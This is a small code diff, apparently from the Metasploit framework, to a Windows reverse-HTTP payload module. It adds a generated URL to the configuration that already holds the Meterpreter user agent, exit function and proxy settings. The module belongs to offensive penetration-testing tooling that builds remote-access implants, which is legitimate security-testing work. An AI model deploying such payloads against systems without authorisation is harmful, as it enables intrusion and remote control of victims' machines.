@@ -51,6 +51,7 @@ module Payload::Windows::ReverseHttp
 
     # Add extra options if we have enough space
     unless self.available_space.nil? || required_space > self.available_space
+      conf[:url]        = generate_uri
       conf[:exitfunk]   = datastore['EXITFUNC']
       conf[:ua]         = datastore['MeterpreterUserAgent']
       conf[:proxy_host] = datastore['PayloadProxyHost']
